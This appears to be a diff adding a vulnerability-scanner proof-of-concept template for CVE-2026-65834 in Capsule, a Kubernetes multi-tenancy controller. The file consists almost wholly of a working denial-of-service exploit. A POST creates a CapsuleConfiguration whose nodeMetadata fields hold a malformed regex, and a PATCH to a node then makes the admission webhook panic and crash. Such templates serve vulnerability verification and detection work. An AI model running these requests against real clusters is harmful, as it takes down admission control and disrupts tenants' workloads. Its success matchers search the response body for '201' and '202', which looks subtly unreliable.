@@ -1,0 +1,66 @@
+[info]
+author = "AVE"
+description = "验证 Capsule 的 CapsuleConfiguration NodeMetadata 正则表达式字段缺乏 webhook 校验导致的拒绝服务漏洞。通过创建包含非法正则的 CapsuleConfiguration 资源，触发 Node 操作时 regexp.MustCompile panic 导致 webhook 崩溃。"
+id = "POC-AVE-2026-0935"
+name = "CVE-2026-65834 PoC"
+severity = "medium"
+tags = [
+    "cve-2026-65834",
+    "capsule",
+    "kubernetes",
+    "dos",
+    "regex",
+]
+vuln_id = [
+    "CVE-2026-65834",
+    "AVE-2026-0935",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/apis/capsule.clastix.io/v1beta2/capsuleconfigurations"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"apiVersion":"capsule.clastix.io/v1beta2","kind":"CapsuleConfiguration","metadata":{"name":"poc-test"},"spec":{"nodeMetadata":{"forbiddenLabels":{"regex":"[invalid-regex("},"forbiddenAnnotations":{"regex":"[invalid-regex("}}}}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "201",
+    "202",
+]
+
+[[poc.requests]]
+method = "PATCH"
+path = "/{{BaseURL}}/api/v1/nodes/{{node_name}}"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"metadata":{"labels":{"poc-test":"trigger"}}}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "application/merge-patch+json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "500",
+    "Internal Error",
+    "connection refused",
+    "timeout",
+]
